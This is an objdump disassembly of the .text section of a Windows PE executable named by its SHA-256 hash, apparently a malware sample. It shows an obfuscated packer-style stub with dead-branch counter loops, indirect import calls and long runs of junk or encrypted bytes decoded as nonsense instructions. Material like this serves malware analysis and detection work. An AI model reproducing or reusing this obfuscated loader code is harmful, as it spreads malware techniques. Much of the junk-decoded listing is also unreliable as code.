
f30788d803941c50544996624339910a7f9a7be01d7cc549ee07f7bcde3eda2a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x43355b
  40100c:	mov    eax,ds:0x413b16
  401011:	xor    DWORD PTR ds:0x4335f3,edx
  401017:	mov    eax,DWORD PTR [eax+0x198]
  40101d:	mov    ecx,DWORD PTR ds:0x4335a7
  401023:	or     DWORD PTR ds:0x433553,ecx
  401029:	mov    DWORD PTR [ebp-0x8],eax
  40102c:	mov    DWORD PTR ds:0x433543,0x436b
  401036:	jmp    0x40133c
  40103b:	mov    ah,0xd6
  40103d:	ja     0x40109f
  40103f:	jno    0x4010ae
  401041:	mov    bl,0xd2
  401043:	js     0x4010a2
  401045:	repz sbb DWORD PTR [ebp+0x7ccdd688],esi
  40104c:	jl     0x4010ca
  40104e:	jl     0x4010b7
  401050:	jle    0x4010ce
  401052:	jl     0x401020
  401054:	xlat   BYTE PTR ds:[ebx]
  401055:	cmp    ecx,edx
  401057:	(bad)
  40105a:	ffree  st(0)
  40105c:	pop    es
  40105d:	push   es
  40105e:	add    eax,DWORD PTR [edx]
  401060:	add    DWORD PTR [edx],0xf
  401063:	xor    ecx,DWORD PTR [edi]
  401065:	ret    0xc71a
  401068:	adc    bl,BYTE PTR [edi]
  40106a:	inc    ebp
  40106b:	pop    edx
  40106c:	add    dh,BYTE PTR [edi-0x4610f327]
  401072:	fcmovnbe st,st(4)
  401074:	add    ecx,DWORD PTR [esp+0x4da0f6bc]
  40107b:	adc    DWORD PTR [ecx+0x641f44dc],ebp
  401081:	out    dx,al
  401082:	outs   dx,DWORD PTR ds:[esi]
  401083:	or     ebx,DWORD PTR ds:0x42d47a9e
  401089:	test   al,0x53
  40108b:	sub    ebp,ebx
  40108d:	(bad)  
  40108e:	ds test eax,0xabc17b88
  401094:	add    al,0xc6
  401096:	ror    DWORD PTR [ebp-0x3a6d2b7b],cl
  40109c:	jmp    0x4010d0
  40109e:	mov    esi,ebp
  4010a0:	dec    edi
  4010a1:	in     al,0xa4
  4010a3:	dec    ebp
  4010a4:	call   DWORD PTR [edi-0x274af866]
  4010aa:	mov    ecx,0x5134e949
  4010af:	and    esi,DWORD PTR [eax-0x41639318]
  4010b5:	jnp    0x4010d4
  4010b7:	ret    
  4010b8:	nop
  4010b9:	sub    eax,0xc05cebd6
  4010be:	out    0xba,al
  4010c0:	bnd call 0x770f4e56
  4010c6:	popa   
  4010c7:	xlat   BYTE PTR ds:[ebx]
  4010c8:	and    cl,cl
  4010ca:	add    ch,ah
  4010cc:	sbb    eax,0x331a45d
  4010d1:	outs   dx,DWORD PTR ds:[esi]
  4010d2:	ins    DWORD PTR es:[edi],dx
  4010d3:	jp     0x4010df
  4010d5:	cmp    eax,0x2a568cd9
  4010da:	jno    0x40115b
  4010dc:	cmp    al,0x8f
  4010de:	or     bl,bl
  4010e0:	mov    ah,0xb
  4010e2:	pop    ebx
  4010e3:	push   ecx
  4010e4:	(bad)  
  4010e6:	adc    eax,0x25e55ed3
  4010eb:	jge    0x401089
  4010ed:	inc    esp
  4010ee:	dec    ebx
  4010ef:	aaa    
  4010f0:	adc    DWORD PTR [ebx],ebp
  4010f2:	ja     0x401129
  4010f4:	sbb    bl,dl
  4010f6:	cmp    al,0x4f
  4010f8:	jmp    0xefc1:0xbd33a6ce
  4010ff:	in     eax,0x6e
  401101:	or     eax,0xf17f383a
  401106:	int3   
  401107:	pop    ss
  401108:	push   es
  401109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40110a:	jecxz  0x40110b
  40110c:	lock inc ebx
  40110e:	hlt    
  40110f:	imul   eax,DWORD PTR [ebx-0x14],0x9cae6f59
  401116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401117:	jge    0x4010c8
  401119:	add    esi,ebx
  40111b:	adc    dl,BYTE PTR [ecx+0x41]
  40111e:	shl    BYTE PTR [edi+0x18a7329],0xa9
  401125:	mov    ecx,0x3d80790
  40112a:	(bad)  
  40112b:	in     eax,dx
  40112c:	xchg   edi,eax
  40112d:	dec    esp
  40112e:	mov    edi,DWORD PTR [ebx]
  401130:	xor    BYTE PTR [ebx-0x4c765be8],dh
  401136:	lods   eax,DWORD PTR ds:[esi]
  401137:	gs (bad) 
  401139:	ins    DWORD PTR es:[edi],dx
  40113a:	sub    eax,DWORD PTR [ebx]
  40113c:	pop    esp
  40113d:	in     al,0x3f
  40113f:	(bad)  
  401140:	mov    al,0x62
  401142:	xor    al,0xbd
  401144:	jo     0x401139
  401146:	dec    ebp
  401147:	and    BYTE PTR [ecx],ch
  401149:	in     al,dx
  40114a:	sti    
  40114b:	cwde   
  40114c:	xchg   esp,eax
  40114d:	sub    ch,dl
  40114f:	xchg   edi,eax
  401150:	cmp    DWORD PTR [edi],0xd8beeb94
  401156:	les    edi,FWORD PTR [eax+0x27]
  401159:	fstp   TBYTE PTR [ecx+0x10]
  40115c:	mov    es:0xe040b8fd,al
  401162:	std    
  401163:	aad    0xde
  401165:	rcr    al,0xb8
  401168:	xlat   BYTE PTR ds:[ebx]
  401169:	ins    BYTE PTR es:[edi],dx
  40116a:	test   al,0x49
  40116c:	mov    cl,0x7
  40116e:	inc    esp
  40116f:	cmp    al,bh
  401171:	cli    
  401172:	sbb    cl,BYTE PTR cs:[ebp+0x2b]
  401176:	mov    al,BYTE PTR [ebx+0x23]
  401179:	sub    ecx,ebp
  40117b:	in     al,0xce
  40117d:	push   edx
  40117e:	adc    edx,DWORD PTR ds:[edi]
  401181:	push   ebp
  401182:	sbb    eax,edi
  401184:	(bad)  
  401185:	sar    bh,1
  401187:	imul   edx,DWORD PTR [eax],0xe3d79bd9
  40118d:	call   0x3f7b:0xaf5bfe4c
  401194:	or     BYTE PTR [eax+eax*4],ah
  401197:	rcl    DWORD PTR [esi],cl
  401199:	and    ecx,ebp
  40119b:	mov    dl,0xfa
  40119d:	inc    BYTE PTR [eax+0x60cc80a6]
  4011a3:	pop    edi
  4011a4:	ja     0x4011ba
  4011a6:	sar    esp,0x42
  4011a9:	sub    al,0x4b
  4011ab:	push   esi
  4011ac:	mov    eax,ds:0x8204cda1
  4011b1:	dec    ebx
  4011b2:	adc    BYTE PTR [eax+0x13c22cef],0x15
  4011b9:	mov    ch,0x8
  4011bb:	and    eax,0x562170e3
  4011c0:	shl    DWORD PTR [ebx+0x39],cl
  4011c3:	and    eax,0x4d213b5
  4011c8:	cmp    eax,0xf8d551fb
  4011cd:	mov    cl,BYTE PTR [ecx-0x48]
  4011d0:	in     al,0xfe
  4011d2:	stos   BYTE PTR es:[edi],al
  4011d3:	pop    esp
  4011d4:	sbb    eax,0x66953d1d
  4011d9:	es jb  0x401181
  4011dc:	lahf   
  4011dd:	and    al,0xdc
  4011df:	mov    cl,0x21
  4011e1:	dec    ecx
  4011e2:	mov    bl,BYTE PTR [ebx-0x2de747b3]
  4011e8:	mov    cl,0x28
  4011ea:	fimul  WORD PTR [eax+eax*4]
  4011ed:	inc    esi
  4011ee:	rcl    BYTE PTR [esi],0xc8
  4011f1:	dec    ecx
  4011f2:	(bad)  [ebx+eax*4+0x41b2271a]
  4011f9:	and    al,0x82
  4011fb:	aam    0x16
  4011fd:	(bad)  
  4011fe:	xchg   edx,eax
  4011ff:	and    dl,bl
  401201:	dec    esp
  401202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401203:	outs   dx,BYTE PTR ds:[esi]
  401204:	add    ebp,DWORD PTR [eax+0x727645b4]
  40120a:	pop    ss
  40120b:	imul   ebp,DWORD PTR [edi-0x4c],0x4d
  40120f:	mov    edx,0x469f23c2
  401214:	ret    0x1c5f
  401217:	inc    esi
  401218:	mov    esi,0x64c5a3fa
  40121d:	cld    
  40121e:	shl    DWORD PTR [ecx],1
  401220:	jge    0x4011c8
  401222:	mov    ch,0xee
  401224:	mov    esp,0xd0673e09
  401229:	mov    ?,ecx
  40122b:	jbe    0x401231
  40122d:	arpl   WORD PTR [edx+0x15],bp
  401230:	pop    esi
  401231:	add    edx,DWORD PTR ds:0x85ba8f76
  401237:	into   
  401238:	xor    al,0x3c
  40123a:	pop    ebp
  40123b:	pushf  
  40123c:	inc    esi
  40123d:	inc    edx
  40123e:	popa   
  40123f:	cmp    al,0xa2
  401241:	fs dec esi
  401243:	mov    ds:0x635ab0e2,eax
  401248:	xchg   DWORD PTR [edx+0x7a],ebp
  40124b:	mov    ebx,DWORD PTR [ecx+0x242627ea]
  401251:	rol    BYTE PTR [ebp+0x9],cl
  401254:	mov    dl,0xd0
  401256:	push   ebx
  401257:	and    eax,0xcca1e185
  40125c:	fldcw  WORD PTR [edx+esi*2]
  40125f:	in     eax,dx
  401260:	pop    ebp
  401261:	push   ds
  401262:	popa   
  401263:	popa   
  401264:	xchg   edx,eax
  401265:	mov    dl,0xa4
  401267:	mov    al,0x5d
  401269:	sub    eax,0x1735c1da
  40126e:	sub    esi,ebx
  401270:	mov    ?,eax
  401272:	xchg   edx,eax
  401273:	xchg   ebx,eax
  401274:	xor    ch,BYTE PTR [ecx-0x4436513b]
  40127a:	fxtract 
  40127c:	jo     0x40126f
  40127e:	cs push edi
  401280:	sti    
  401281:	lods   al,BYTE PTR ds:[esi]
  401282:	pushf  
  401283:	in     al,dx
  401284:	test   DWORD PTR [ebx-0x3b9c16c4],edi
  40128a:	test   eax,0xeacb799d
  40128f:	add    al,0x36
  401291:	mov    al,0xc1
  401293:	jb     0x40124f
  401295:	test   DWORD PTR [eax+0x1b7b2546],0x157c87a3
  40129f:	inc    esi
  4012a0:	clc    
  4012a1:	dec    esi
  4012a2:	mov    ds:0xb8b0f147,eax
  4012a7:	popa   
  4012a8:	mov    dh,0x2b
  4012aa:	es sub eax,0x8cc6d23f
  4012b0:	sbb    al,0x65
  4012b2:	nop
  4012b3:	mov    ds:0x4ed5e25f,al
  4012b8:	mov    ds:0x3b70fff2,al
  4012bd:	sub    eax,0xf69b9371
  4012c2:	stc    
  4012c3:	icebp  
  4012c4:	jl     0x40133e
  4012c6:	call   0x69d1dc4b
  4012cb:	mov    bl,0x50
  4012cd:	pop    ds
  4012ce:	callw  0xc0cb
  4012d2:	in     eax,dx
  4012d3:	and    BYTE PTR [esi-0x55],0xc7
  4012d7:	or     BYTE PTR [edi],bl
  4012d9:	inc    ecx
  4012da:	repnz cli 
  4012dc:	push   ss
  4012dd:	fisub  DWORD PTR [ebp-0x76]
  4012e0:	clc    
  4012e1:	xor    eax,0x649671bd
  4012e6:	enter  0x939a,0xb1
  4012ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012eb:	and    edx,ebp
  4012ed:	cmp    dl,BYTE PTR [eax+ebx*1-0x4f]
  4012f1:	push   es
  4012f2:	gs xchg edx,eax
  4012f4:	mov    ch,0x63
  4012f7:	pop    edx
  4012f8:	cmp    ch,dh
  4012fa:	(bad)  
  4012fb:	and    esp,DWORD PTR [edx+ebx*1]
  4012fe:	inc    edi
  4012ff:	push   ss
  401300:	jno    0x401321
  401302:	popa   
  401303:	lds    esp,FWORD PTR [esi+0x2740c1d0]
  401309:	lahf   
  40130a:	test   DWORD PTR [eax+0x23dc787a],edi
  401310:	dec    esp
  401311:	inc    edi
  401312:	cdq    
  401313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401314:	mov    edi,0x4504fcce
  401319:	in     eax,0xc2
  40131b:	sbb    DWORD PTR ds:0x4685ac98,esp
  401321:	daa    
  401322:	push   ebp
  401323:	push   esp
  401324:	mov    ah,0x68
  401326:	dec    ebx
  401327:	sbb    BYTE PTR [ebx+edi*4+0x2008d3d2],dl
  40132e:	adc    al,0xfb
  401330:	es xchg esi,eax
  401332:	push   ds
  401333:	pop    eax
  401334:	inc    edi
  401335:	mov    edx,0x12dc62e
  40133a:	adc    cl,BYTE PTR [eax-0x75]
  40133d:	inc    ebp
  40133e:	or     BYTE PTR [ebx+0x953f84d],cl
  401344:	adc    eax,0x4335a7
  401349:	push   esi
  40134a:	add    esi,DWORD PTR ds:0x43359b
  401350:	mov    esi,0x7510853
  401355:	and    ebx,0x1c58
  40135b:	xor    eax,esi
  40135d:	and    DWORD PTR ds:0x43361f,0x0
  401367:	jmp    0x401379
  40136c:	mov    ebx,DWORD PTR ds:0x43361f
  401372:	inc    ebx
  401373:	mov    DWORD PTR ds:0x43361f,ebx
  401379:	cmp    DWORD PTR ds:0x43361f,0x11
  401380:	jae    0x4013b5
  401386:	cmp    DWORD PTR ds:0x43361f,0x16
  40138d:	jne    0x4013b0
  401393:	push   0x12df
  401398:	push   DWORD PTR [ebp-0x18]
  40139b:	push   0x49a7
  4013a0:	push   0x1ff7
  4013a5:	push   0x54a2
  4013aa:	call   DWORD PTR ds:0x41224c
  4013b0:	jmp    0x40136c
  4013b5:	push   edi
  4013b6:	or     edi,edi
  4013b8:	mov    edi,0x32729a
  4013bd:	not    ebx
  4013bf:	add    eax,edi
  4013c1:	adc    ebx,0x3cf3
  4013c7:	mov    DWORD PTR [ecx],eax
  4013c9:	sbb    DWORD PTR ds:0x433563,0x6b1e
  4013d3:	lea    eax,[ebp-0x4]
  4013d6:	mov    DWORD PTR [ebp-0x10],eax
  4013d9:	mov    eax,DWORD PTR [ebp+0x8]
  4013dc:	xor    DWORD PTR ds:0x43359f,0x46ad
  4013e6:	mov    ecx,DWORD PTR [ebp-0x10]
  4013e9:	xor    eax,esi
  4013eb:	add    eax,edi
  4013ed:	mov    DWORD PTR ds:0x433597,0x19
  4013f7:	cmp    DWORD PTR ds:0x433597,0x0
  4013fe:	je     0x40144d
  401404:	cmp    DWORD PTR ds:0x433597,0xb
  40140b:	jne    0x401421
  401411:	push   0x433553
  401416:	push   0x62b0
  40141b:	call   DWORD PTR ds:0x41217c
  401421:	cmp    DWORD PTR ds:0x433597,0xc
  401428:	jne    0x40143b
  40142e:	mov    ebx,DWORD PTR ds:0x433597
  401434:	dec    ebx
  401435:	mov    DWORD PTR ds:0x433597,ebx
  40143b:	mov    ebx,DWORD PTR ds:0x433597
  401441:	dec    ebx
  401442:	mov    DWORD PTR ds:0x433597,ebx
  401448:	jmp    0x4013f7
  40144d:	mov    DWORD PTR [ecx],eax
  40144f:	or     DWORD PTR ds:0x43354f,0x433543
  401459:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  401460:	xor    DWORD PTR ds:0x433553,ebx
  401466:	lea    eax,[ebp-0x14]
  401469:	neg    ecx
  40146b:	mov    DWORD PTR [ebp-0x20],eax
  40146e:	mov    eax,DWORD PTR [ebp-0x14]
  401471:	mov    ecx,DWORD PTR [ebp-0x20]
  401474:	xor    eax,esi
  401476:	neg    ebx
  401478:	add    eax,edi
  40147a:	mov    DWORD PTR [ecx],eax
  40147c:	and    DWORD PTR ds:0x43361b,0x0
  401486:	xor    eax,eax
  401488:	add    eax,DWORD PTR ds:0x43361b
  40148e:	inc    eax
  40148f:	mov    ds:0x43361b,eax
  401494:	cmp    DWORD PTR ds:0x43361b,0x9
  40149b:	jne    0x4014ac
  4014a1:	push   0x8c0a
  4014a6:	call   DWORD PTR ds:0x412250
  4014ac:	cmp    DWORD PTR ds:0x43361b,0x8
  4014b3:	jne    0x4014c4
  4014b9:	mov    eax,ds:0x43361b
  4014be:	inc    eax
  4014bf:	mov    ds:0x43361b,eax
  4014c4:	cmp    DWORD PTR ds:0x43361b,0x1c
  4014cb:	jb     0x401486
  4014d1:	mov    eax,ds:0x413bea
  4014d6:	mov    ebx,0x8e12febe
  4014db:	sbb    DWORD PTR ds:0x4335df,0x47a9
  4014e5:	mov    DWORD PTR [ebp-0xc],ebx
  4014e8:	dec    DWORD PTR ds:0x43355b
  4014ee:	mov    eax,DWORD PTR [eax]
  4014f0:	mov    cx,WORD PTR [ebp-0x4]
  4014f4:	movzx  ecx,cx
  4014f7:	sbb    DWORD PTR ds:0x43354f,0x43359f
  401501:	jmp    0x401807
  401506:	mov    dh,0x9a
  401508:	adc    cl,al
  40150a:	adc    BYTE PTR [ecx+0x7d],dh
  40150d:	jne    0x4014ba
  40150f:	arpl   ax,bx
  401511:	ins    DWORD PTR es:[edi],dx
  401512:	xchg   esi,eax
  401513:	cmp    al,0xae
  401515:	(bad)  
  401516:	addr16 jle 0x401595
  401519:	jl     0x401582
  40151b:	jle    0x401599
  40151d:	jl     0x401590
  40151f:	js     0x40151a
  401521:	out    dx,eax
  401522:	push   esp
  401523:	adc    ah,BYTE PTR [ebp+0x5e]
  401526:	sar    al,cl
  401528:	outs   dx,BYTE PTR ds:[esi]
  401529:	jo     0x40157a
  40152b:	or     DWORD PTR [ebp-0x3d618680],0x46
  401532:	pop    esi
  401533:	js     0x401560
  401535:	cmc    
  401536:	fsubr  QWORD PTR ds:0xd415deaf
  40153c:	fisttp WORD PTR [edx+0x55]
  40153f:	sbb    al,0x42
  401541:	aaa    
  401542:	lock mov eax,ds:0x8f93894a
  401548:	dec    ebp
  401549:	call   0xb1e3:0x24f71b30
  401550:	dec    ecx
  401551:	loopne 0x40156f
  401553:	das    
  401554:	push   eax
  401555:	retf   0x1f3e
  401558:	dec    ecx
  401559:	mov    eax,0xf363d68f
  40155e:	lock mov edx,ecx
  401561:	pop    ebp
  401562:	ror    BYTE PTR [esi],1
  401564:	clc    
  401565:	dec    esi
  401566:	and    al,0x7d
  401568:	gs std 
  40156a:	pop    ss
  40156b:	and    BYTE PTR ds:0xd0bd6573,0xa9
  401572:	inc    edi
  401573:	popa   
  401574:	xor    esi,esp
  401576:	cs mov dh,0x18
  401579:	daa    
  40157a:	push   ds
  40157b:	scas   eax,DWORD PTR es:[edi]
  40157c:	and    esp,DWORD PTR [edx]
  40157e:	in     eax,0x9
  401580:	xchg   ecx,eax
  401581:	and    al,0xf2
  401583:	sub    ecx,edx
  401585:	js     0x4015a6
  401587:	push   0x49a9e7a8
  40158c:	xchg   DWORD PTR [ebp+ebx*4+0x2d],esp
  401590:	mov    edx,0x4e8d2fcc
  401595:	out    dx,eax
  401596:	add    eax,DWORD PTR ds:0x4794ee96
  40159c:	ds cmp al,0xe9
  40159f:	inc    edx
  4015a0:	push   edx
  4015a1:	lock mov WORD PTR [esi+0x1ba1cd0],gs
  4015a8:	sti    
  4015a9:	gs sahf 
  4015ab:	in     al,dx
  4015ac:	dec    edi
  4015ad:	gs push es
  4015af:	stc    
  4015b0:	sbb    esi,DWORD PTR [ebp+0x4e]
  4015b3:	mov    al,0xfc
  4015b5:	inc    edx
  4015b6:	and    al,0xf6
  4015b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b9:	dec    ebx
  4015ba:	ret    0x4cfd
  4015bd:	sbb    ebx,esp
  4015bf:	retf   
  4015c0:	adc    dl,BYTE PTR [ebx-0x9e371f3]
  4015c6:	and    esp,ebp
  4015c8:	icebp  
  4015c9:	retf   
  4015ca:	xor    BYTE PTR [ecx],0x3c
  4015cd:	out    dx,al
  4015ce:	mov    ah,0x27
  4015d0:	xor    dh,dh
  4015d2:	add    cl,BYTE PTR cs:[eax-0x2fdc4ee5]
  4015d9:	mov    edi,0xe9b55d39
  4015de:	aad    0x20
  4015e0:	lahf   
  4015e1:	push   esi
  4015e2:	inc    esi
  4015e3:	fldenv [eax]
  4015e5:	fdivp  st(1),st
  4015e7:	push   0x136b949e
  4015ec:	sub    BYTE PTR [edx+esi*8],cl
  4015ef:	dec    edi
  4015f0:	pop    edi
  4015f1:	in     al,0xf4
  4015f3:	leave  
  4015f4:	(bad)  
  4015f6:	adc    ah,BYTE PTR [ecx]
  4015f8:	loopne 0x40159e
  4015fa:	scas   eax,DWORD PTR es:[edi]
  4015fb:	cs ret 0x6829
  4015ff:	push   0xf0395724
  401604:	test   al,0xf5
  401606:	mov    DWORD PTR [ebx+ebp*1-0x52f24e40],0xe4620d2a
  401611:	retf   
  401612:	sbb    al,0x8
  401614:	xor    DWORD PTR [ebp-0x28],eax
  401617:	sahf   
  401618:	mov    ebx,0xa59d489e
  40161d:	fisttp WORD PTR [ecx]
  40161f:	add    BYTE PTR [edx+0x400b5806],dh
  401625:	mov    edx,0x657a5161
  40162a:	sub    dl,BYTE PTR [edx+0x1e07c228]
  401630:	jne    0x401643
  401632:	push   edx
  401633:	push   edx
  401634:	cmp    dh,BYTE PTR [ebp+0x49]
  401637:	inc    edi
  401638:	cmc    
  401639:	scas   eax,DWORD PTR es:[edi]
  40163a:	sub    esi,DWORD PTR [eax-0x7a]
  40163d:	gs gs add eax,0xe7552ef1
  401644:	adc    ebx,DWORD PTR [eax-0x45]
  401647:	(bad)  
  401648:	push   edi
  401649:	or     ch,BYTE PTR [edi+0x72c7361d]
  40164f:	jae    0x401656
  401651:	(bad)  
  401652:	popf   
  401653:	pop    ebx
  401654:	bound  ecx,QWORD PTR [ebx+ecx*8+0xd4bab80]
  40165b:	sbb    ebx,0xd0f585fb
  401661:	nop
  401662:	mov    DWORD PTR [edi-0x6e],eax
  401665:	icebp  
  401666:	out    0xa5,al
  401668:	push   0x2d84a6d6
  40166d:	dec    eax
  40166e:	inc    esi
  40166f:	int    0xa3
  401671:	neg    bh
  401673:	(bad)  
  401675:	and    DWORD PTR [ecx-0x3407e8e8],esi
  40167b:	xor    DWORD PTR [ecx],esp
  40167d:	fsub   st,st(2)
  40167f:	adc    al,0xca
  401681:	in     eax,0x74
  401683:	ret    0x6471
  401686:	pop    ss
  401687:	inc    ecx
  401688:	rol    BYTE PTR [edx+0x5f2529ed],0x12
  40168f:	test   BYTE PTR [esp+ebx*8-0x52],dh
  401693:	pop    ebp
  401694:	fcmovb st,st(3)
  401696:	dec    ebx
  401697:	mov    edi,0xcb91891d
  40169c:	imul   ebp,DWORD PTR [eax-0x7bf603d7],0x42
  4016a3:	xchg   esi,eax
  4016a4:	xchg   ebp,eax
  4016a5:	stos   BYTE PTR es:[edi],al
  4016a6:	push   ebp
  4016a7:	mov    dh,0x21
  4016a9:	(bad)  
  4016aa:	sti    
  4016ab:	sub    BYTE PTR [edx+0x121ddbb2],cl
  4016b1:	aas    
  4016b2:	jecxz  0x4016d1
  4016b4:	(bad)  
  4016b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016b7:	mov    eax,0xda99c633
  4016bc:	sbb    BYTE PTR [eax],al
  4016be:	repnz add ecx,DWORD PTR [edi+eiz*8-0x20]
  4016c3:	and    DWORD PTR [ecx-0x43],edi
  4016c6:	xlat   BYTE PTR ds:[ebx]
  4016c7:	lods   eax,DWORD PTR ds:[esi]
  4016c8:	sbb    al,0xfb
  4016ca:	sub    edx,ecx
  4016cc:	outs   dx,DWORD PTR ds:[esi]
  4016cd:	jns    0x40171a
  4016cf:	fld    QWORD PTR [eax]
  4016d1:	in     al,dx
  4016d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016d3:	mov    ah,0xb5
  4016d5:	dec    eax
  4016d6:	mov    dh,0xe9
  4016d8:	push   ecx
  4016d9:	dec    ebx
  4016da:	inc    esi
  4016db:	xchg   BYTE PTR [ecx+0xf],dl
  4016de:	add    BYTE PTR [eax+edx*2],cl
  4016e1:	loope  0x401685
  4016e3:	ret    
  4016e4:	ficom  WORD PTR [ebx+0x7e82d424]
  4016ea:	mov    ds:0x1ac9c67a,al
  4016ef:	mov    al,0xa
  4016f1:	dec    ebx
  4016f2:	sub    BYTE PTR [esi],0x88
  4016f5:	or     eax,0xbec66fe7
  4016fa:	in     eax,0xd8
  4016fc:	test   BYTE PTR [eax-0x4],0xa0
  401700:	mov    esp,DWORD PTR [edx+0x78ddb18d]
  401706:	shl    DWORD PTR [ebx+0x75f8b57b],0x66
  40170d:	sbb    cl,BYTE PTR [edx+0x27b76a6e]
  401713:	lahf   
  401714:	iret   
  401715:	pusha  
  401716:	jl     0x40174f
  401718:	iret   
  401719:	loopne 0x40171d
  40171b:	sub    BYTE PTR [edi],ch
  40171d:	ret    0x7c69
  401720:	mov    ah,0x3a
  401722:	pop    esp
  401723:	mov    edi,0xa963b3c8
  401728:	mov    dh,BYTE PTR [edx+0x16167b20]
  40172e:	inc    esi
  40172f:	push   0x7d8a3ae7
  401734:	inc    esp
  401735:	popf   
  401736:	ins    DWORD PTR es:[edi],dx
  401737:	cmp    BYTE PTR [ebx],0xcc
  40173a:	iret   
  40173b:	push   esp
  40173c:	mov    ds:0xc6214329,al
  401741:	push   cs
  401742:	mov    esp,0x1386f3ca
  401747:	mov    edx,0xdcb187bf
  40174c:	mov    ebx,0x98f07f13
  401751:	(bad)  
  401753:	(bad)  
  401754:	push   ebp
  401755:	popf   
  401756:	int3   
  401757:	jmp    0xf744ae8a
  40175c:	sti    
  40175d:	add    eax,0xb7dcc3d7
  401762:	xchg   ecx,eax
  401763:	clc    
  401764:	inc    ebp
  401765:	push   0x52
  401767:	xor    dh,cl
  401769:	sub    DWORD PTR [esi*4-0x5d872607],0x6b
  401771:	shr    DWORD PTR [esi],1
  401773:	or     ebp,DWORD PTR [ecx+ebp*2]
  401776:	jp     0x4017b0
  401778:	mov    ecx,0xe00e858a
  40177d:	(bad)  
  40177e:	jle    0x401707
  401780:	dec    esp
  401781:	retf   
  401782:	and    BYTE PTR [esi+0x2e2a8802],0x59
  401789:	sti    
  40178a:	outs   dx,BYTE PTR ds:[esi]
  40178b:	jo     0x4017f8
  40178d:	js     0x4017e7
  40178f:	xchg   ecx,eax
  401790:	inc    esp
  401791:	inc    esp
  401792:	leave  
  401793:	jmp    0x401775
  401795:	lock adc BYTE PTR [ebp+0xb9e89f3],ah
  40179c:	dec    esp
  40179d:	xlat   BYTE PTR ds:[ebx]
  40179e:	add    al,0x79
  4017a0:	(bad)  
  4017a2:	mov    DWORD PTR [ecx-0x2c],ebx
  4017a5:	aam    0x6b
  4017a7:	rcr    BYTE PTR [edx],1
  4017a9:	call   0x7d26:0xddd01c9d
  4017b0:	cwde   
  4017b1:	xor    DWORD PTR [eax-0x664d9a7f],0x64fa3c26
  4017bb:	mov    bh,0xea
  4017bd:	jle    0x401763
  4017bf:	nop
  4017c0:	inc    ecx
  4017c1:	pop    esi
  4017c2:	repnz (bad) 
  4017c4:	mov    al,ds:0x77354064
  4017c9:	shl    dl,cl
  4017cb:	xchg   edi,eax
  4017cc:	adc    BYTE PTR [edi+ebx*8],dl
  4017cf:	xor    esi,DWORD PTR [eax+0x5f0c5c42]
  4017d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d6:	jecxz  0x40175d
  4017d8:	pop    esi
  4017d9:	fs int 0x85
  4017dc:	push   esp
  4017dd:	sar    BYTE PTR [eax],1
  4017df:	adc    eax,0x9e1be857
  4017e4:	and    ebp,ecx
  4017e6:	mov    ds:0x62084535,al
  4017eb:	test   esp,edx
  4017ed:	adc    ah,BYTE PTR [esi-0x31c2d26f]
  4017f3:	mov    esi,0xafad7b29
  4017f8:	and    DWORD PTR [eax-0x52c1b4c9],esi
  4017fe:	mov    WORD PTR [esi-0x16914a95],?
  401804:	stos   BYTE PTR es:[edi],al
  401805:	or     BYTE PTR [eax+0x57a10803],0x36
  40180c:	inc    ebx
  40180d:	add    BYTE PTR [ecx],al
  40180f:	add    eax,0x43354b
  401814:	mov    DWORD PTR [ebp-0x18],ecx
  401817:	mov    eax,DWORD PTR [ebp+0x8]
  40181a:	xor    DWORD PTR ds:0x43359b,0x1391
  401824:	mov    ecx,DWORD PTR [ebp-0x8]
  401827:	xor    eax,esi
  401829:	add    eax,edi
  40182b:	cmp    DWORD PTR [ecx],eax
  40182d:	mov    DWORD PTR ds:0x43359b,0x716
  401837:	jne    0x402597
  40183d:	mov    eax,DWORD PTR [ebp+0x8]
  401840:	add    DWORD PTR ds:0x433563,edi
  401846:	mov    ecx,DWORD PTR [ebp-0x18]
  401849:	or     DWORD PTR ds:0x43362f,0x433617
  401853:	xor    eax,esi
  401855:	add    eax,edi
  401857:	cmp    DWORD PTR [ecx],eax
  401859:	jne    0x401f33
  40185f:	sbb    ecx,DWORD PTR ds:0x4335ab
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	mov    DWORD PTR ds:0x4335e7,0x18
  401872:	cmp    DWORD PTR ds:0x4335e7,0x0
  401879:	je     0x4018bc
  40187f:	cmp    DWORD PTR ds:0x4335e7,0x28
  401886:	jne    0x4018a2
  40188c:	push   DWORD PTR [ebp-0x24]
  40188f:	push   DWORD PTR [ebp-0xc]
  401892:	push   0x6fcb
  401897:	push   0x70d4
  40189c:	call   DWORD PTR ds:0x4120b4
  4018a2:	xor    edx,edx
  4018a4:	add    edx,DWORD PTR ds:0x4335e7
  4018aa:	dec    edx
  4018ab:	mov    DWORD PTR ds:0x4335e7,edx
  4018b1:	jmp    0x401872
  4018b6:	adc    edx,0x63fa
  4018bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4018bf:	and    DWORD PTR ds:0x433617,0x0
  4018c9:	jmp    0x4018db
  4018ce:	mov    edx,DWORD PTR ds:0x433617
  4018d4:	inc    edx
  4018d5:	mov    DWORD PTR ds:0x433617,edx
  4018db:	cmp    DWORD PTR ds:0x433617,0x15
  4018e2:	jae    0x401910
  4018e8:	cmp    DWORD PTR ds:0x433617,0x17
  4018ef:	jne    0x40190b
  4018f5:	push   0x43366f
  4018fa:	push   DWORD PTR [ebp-0x10]
  4018fd:	push   0x6a0b
  401902:	push   DWORD PTR [ebp-0xc]
  401905:	call   DWORD PTR ds:0x4120b8
  40190b:	jmp    0x4018ce
  401910:	xor    eax,esi
  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
